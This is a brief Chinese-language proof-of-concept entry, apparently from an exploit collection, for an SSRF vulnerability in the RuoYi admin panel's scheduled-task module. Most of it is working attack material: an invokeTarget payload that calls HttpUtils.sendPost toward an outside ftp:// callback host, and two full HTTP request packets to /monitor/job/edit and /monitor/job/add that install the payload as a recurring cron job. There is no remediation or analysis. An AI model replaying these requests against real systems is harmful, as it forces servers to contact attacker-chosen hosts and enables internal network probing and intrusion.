## 若依后台定时任务存在SSRF漏洞


## poc
```
com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp://6a928e83f9.ipv6.1433.eu.org','')
```

![6bd379ec73798d26af505482a1863868](https://github.com/wy876/POC/assets/139549762/86812c61-c4ba-42da-9b39-564b19756bef)

![a2f9e3adc46a688643f3688d1464005c](https://github.com/wy876/POC/assets/139549762/ea2b8763-2303-4f6b-aa55-7b86a5a2f071)

## 数据包
```
POST /monitor/job/edit HTTP/1.1
Host: xxx
Connection: keep-alive
Content-Length: 242
sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4

jobId=102&updateBy=admin&jobName=test&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=1&remark=
```

```
POST /monitor/job/add HTTP/1.1
Host: xxxx
Connection: keep-alive
Content-Length: 232
sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4

createBy=admin&jobName=test1&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F1+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```

## 漏洞来源
- https://mp.weixin.qq.com/s/ttn46zznE4-op2GydL1i1A
